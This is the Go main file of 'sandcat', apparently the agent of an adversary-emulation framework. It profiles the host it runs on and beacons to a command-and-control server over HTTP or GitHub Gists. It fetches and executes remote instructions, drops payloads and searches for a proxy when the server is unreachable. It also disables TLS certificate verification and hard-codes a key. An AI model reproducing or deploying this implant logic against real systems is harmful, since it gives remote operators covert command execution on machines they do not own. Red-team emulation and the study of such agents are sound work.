package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strconv"
	"strings"

	"./contact"
	"./execute"
	"./util"
	"./output"
	"./privdetect"
)

const (
	gistC2 = "GIST"
)

/*
These default  values can be overridden during linking - server, group, and sleep can also be overridden
with command-line arguments at runtime.
*/
var (
    key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
    defaultServer = "http://localhost:8888"
    defaultGroup = "my_group"
    defaultSleep = "60"
    defaultC2 = "API"
    githubToken = ""
)

func runAgent(coms contact.Contact, profile map[string]interface{}) {
	for {
		beacon := coms.GetInstructions(profile)
		if beacon["sleep"] != nil {
			profile["sleep"] = beacon["sleep"]
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				fmt.Printf("[*] Running instruction %s\n", command["id"])
				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
				go coms.RunInstruction(command, profile, payloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			util.Sleep(float64(profile["sleep"].(int)))
		}
	}
}

func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	profile := make(map[string]interface{})
	profile["paw"] = paw
	profile["server"] = server
	profile["group"] = group
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["sleep"] = sleep
	profile["pid"] = strconv.Itoa(os.Getpid())
	profile["ppid"] = strconv.Itoa(os.Getppid())
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	profile["privilege"] = privilege
	profile["c2"] = strings.ToUpper(c2)
	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact {
	coms, _ := contact.CommunicationChannels[profile["c2"].(string)]
	if !validC2Configuration(coms, profile["c2"].(string)) {
		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to API")
		coms, _ = contact.CommunicationChannels[defaultC2]
		profile["c2"] = defaultC2
	}
	if coms.Ping(profile["server"].(string)) {
		//go util.StartProxy(profile["server"].(string))
		return coms
	}
	proxy := util.FindProxy()
	if len(proxy) == 0 {
		return nil
	} 
	profile["server"] = proxy
	return coms
}

func validC2Configuration(coms contact.Contact, c2 string) bool {
	switch c2 {
	case gistC2:
		return coms.C2RequirementsMet(githubToken)
	default:
		return false
	}
}

func main() {
	var executors execute.ExecutorFlags
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	server := flag.String("server", defaultServer, "The FQDN of the server")
	group := flag.String("group", defaultGroup, "Attach a group to this agent")
	sleep := flag.String("sleep", defaultSleep, "Initial sleep value for sandcat (integer in seconds)")
	delay := flag.Int("delay", 0, "Delay starting this agent by n-seconds")
	verbose := flag.Bool("v", false, "Enable verbose output")
	c2 := flag.String("c2", defaultC2, "C2 Channel for agent (API and GIST supported)")

	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
	flag.Parse()
	sleepInt, _ := strconv.Atoi(*sleep)
	privilege := privdetect.Privlevel()

    output.SetVerbose(*verbose)
    output.VerbosePrint("Started sandcat in verbose mode.")
    output.VerbosePrint(fmt.Sprintf("server=%s", *server))
    output.VerbosePrint(fmt.Sprintf("group=%s", *group))
    output.VerbosePrint(fmt.Sprintf("sleep=%d", sleepInt))
    output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
    output.VerbosePrint(fmt.Sprintf("initial delay=%d", *delay))
	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", *c2))

	profile := buildProfile(*server, *group, sleepInt, executors, privilege, *c2)
	util.Sleep(float64(*delay))

	for {
		coms := chooseCommunicationChannel(profile)
		if coms != nil {
			for { runAgent(coms, profile) }
		}
		util.Sleep(300)
	}
}
